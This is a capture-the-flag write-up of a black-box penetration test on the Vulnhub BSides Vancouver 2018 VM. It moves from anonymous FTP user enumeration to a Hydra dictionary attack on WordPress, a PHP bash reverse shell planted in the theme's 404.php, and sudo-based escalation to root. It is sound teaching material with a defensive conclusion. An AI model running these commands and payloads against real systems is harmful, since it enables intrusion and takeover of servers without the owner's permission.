
# Black Box — BSides Vancouver 2018

**Platform:** Vulnhub  
**OS:** Linux  
**Difficulty:** Easy  
**Type:** Black Box  
**Status:** Pwned ✅

---

## Objective

Perform a Black Box Penetration Test against the BSides Vancouver 2018 virtual machine. Starting with no prior knowledge of the target system, the goal was to enumerate all exposed services, identify vulnerabilities, gain initial access, escalate privileges to root, and document the full attack chain.

---

## 🧪 Lab Environment

| Machine | Role |
|---|---|
| 🐉 Kali Linux | Attacker machine |
| 💀 BSides Vancouver 2018 | Target virtual machine |

Both systems were connected through a host-only network.

---

## Tools Used

| Tool | Purpose |
|---|---|
| netdiscover | Network scanning to discover the target IP |
| nmap | Port scanning and service enumeration |
| ftp | Anonymous login to retrieve user list |
| Browser | WordPress panel exploration |
| Hydra | Dictionary attack on WordPress login |
| netcat (nc) | Reverse shell listener |

---

## Results

| Port | Service | Finding |
|---|---|---|
| 21 | FTP (vsftpd 2.3.5) | Anonymous login allowed — found `users.txt.bk` with system usernames |
| 22 | SSH (OpenSSH 5.9p1) | Active but key-based auth only — no password login |
| 80 | HTTP (Apache 2.2.22) | Abandoned WordPress site at `/backup_wordpress` — exposed via `robots.txt` |

- **User enumeration** — `users.txt.bk` contained: `abatchy`, `john`, `mai`, `anne`, `doomguy`
- **WordPress login cracked** — user `john` with password `enigma` found via Hydra dictionary attack
- **Remote Code Execution** — PHP reverse shell injected into `404.php` theme file via WordPress admin panel
- **Initial access** obtained as `www-data`
- **Privilege escalation** — switched to user `anne` (password: `princess`) who had unlimited sudo privileges
- **Root access obtained** — full system compromise confirmed, flag retrieved at `/root/flag.txt`

---

## Issues Encountered

1. **VirtualBox DHCP disabled** — the target machine had no IP assigned by default. Fixed by enabling the DHCP service in VirtualBox network settings.

2. **Hydra false positives** — Hydra was returning false positives on the WordPress login form. Fixed by identifying the exact error string (`is incorrect`) and passing it to filter out failed attempts correctly.

3. **Limited reverse shell** — the shell obtained via `404.php` did not allow user switching with `su`. Fixed by upgrading it to a full TTY with:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
↳ Spawns a fully interactive shell from a limited reverse shell.

4. **Hydra speed vs accuracy** — `rockyou.txt` with 14 million passwords would have taken hours. Optimized by testing manually first, then confirming the password was in the wordlist.

---

## Conclusion

The BSides Vancouver 2018 machine was successfully compromised through a chain of simple but realistic vulnerabilities.

The attack path was straightforward: anonymous FTP access exposed a list of system users, a dictionary attack on a WordPress login panel gave admin access, and a PHP reverse shell injected into a theme file provided initial foothold as `www-data`. From there, weak credentials on user `anne` combined with unrestricted sudo privileges made privilege escalation trivial.

The key takeaway is that **no single vulnerability caused the compromise** — it was the combination of several misconfigurations working together:

- Anonymous FTP exposing internal usernames
- An abandoned WordPress installation left public and unmonitored
- Weak passwords crackable with common wordlists
- Excessive sudo privileges assigned to a regular user

All of these are preventable with basic security hygiene. Disable unused services, remove abandoned applications, enforce strong passwords, and always apply the principle of least privilege.

---

## Technical Walkthrough

### 1. Network Discovery

```bash
netdiscover -r 192.168.50.0/24
```
↳ Scans the local network to discover all active hosts and identify the target IP.

---

### 2. Port Scanning

```bash
nmap -sV 192.168.50.3
```
↳ Scans the target for open ports and detects the version of each running service.

**Open ports:**
- 21 → vsftpd 2.3.5 (anonymous login allowed)
- 22 → OpenSSH 5.9p1 (key-based auth only)
- 80 → Apache 2.2.22 (WordPress site)

---

### 3. FTP Anonymous Login

```bash
ftp 192.168.50.3
```
↳ Connects to the FTP server using anonymous credentials.

```bash
cd public
get users.txt.bk
```
↳ Navigates to the public folder and downloads the user list file.

Contents of `users.txt.bk`:
```
abatchy
john
mai
anne
doomguy
```

---

### 4. WordPress Enumeration

Visited `http://192.168.50.3/robots.txt` — the file explicitly revealed the path `/backup_wordpress`.

Tested each username from the list on the WordPress login page at:
```
http://192.168.50.3/backup_wordpress/wp-login.php
```

The error message confirmed that `john` is a valid user.

---

### 5. Dictionary Attack with Hydra

```bash
hydra -l john -P /usr/share/wordlists/rockyou.txt 192.168.50.3 http-post-form "/backup_wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:is incorrect" -t 1
```
↳ Runs a dictionary attack against the WordPress login form using rockyou.txt, filtering failed attempts by the error string "is incorrect".

Result: `john : enigma`

---

### 6. PHP Reverse Shell Upload

Logged into the WordPress admin panel with `john / enigma`.

Navigated to:
```
Appearance → Editor → 404.php (Twenty Sixteen theme)
```

Replaced the file content with a PHP reverse shell:
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.50.5/4444 0>&1'"); ?>
```
↳ Injects a reverse shell payload into the 404 error page of the active WordPress theme.

---

### 7. Catching the Shell

```bash
nc -lvnp 4444
```
↳ Opens a port on the attacker machine waiting for the incoming reverse shell connection.

Triggered the shell by visiting:
```
http://192.168.50.3/backup_wordpress/wp-content/themes/twentysixteen/404.php
```

Initial access obtained as `www-data`.

---

### 8. Shell Upgrade

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
↳ Upgrades the limited reverse shell to a fully interactive TTY, enabling commands like `su`.

---

### 9. Privilege Escalation

```bash
su anne
```
Password: `princess`

```bash
sudo -l
```
↳ Lists all commands the current user is allowed to run as root.

Result: `(ALL : ALL) ALL` — unrestricted sudo access.

```bash
sudo su
```
↳ Switches to the root user using anne's sudo privileges.

---

### 10. Flag

```bash
cat /root/flag.txt
```

```
Congratulations!

If you can read this, that means you were able to obtain root
permissions on this VM. You should be proud!
```

---

## Screenshot Captions

- Figure 1 – Download and startup of the BSides Vancouver 2018 virtual machine.
- Figure 2 – Enabling DHCP on VirtualBox and configuring Kali Linux.
- Figure 3 – Network host discovery scan.
- Figure 4 – Target port scan and service enumeration.
- Figure 5 – FTP anonymous login and user list download.
- Figure 6 – User enumeration from users.txt.bk and WordPress username validation.
- Figure 7 – Hydra dictionary attack on WordPress login — credentials found: john / enigma.
- Figure 8 – PHP reverse shell injection and initial access as www-data.
- Figure 9 – Shell upgrade, privilege escalation to anne and root.
- Figure 10 – Flag retrieved at /root/flag.txt.

---

> ⚠️ **Disclaimer:** This lab was performed in a controlled environment for educational purposes only. All tools were used exclusively on machines owned and managed by the author.
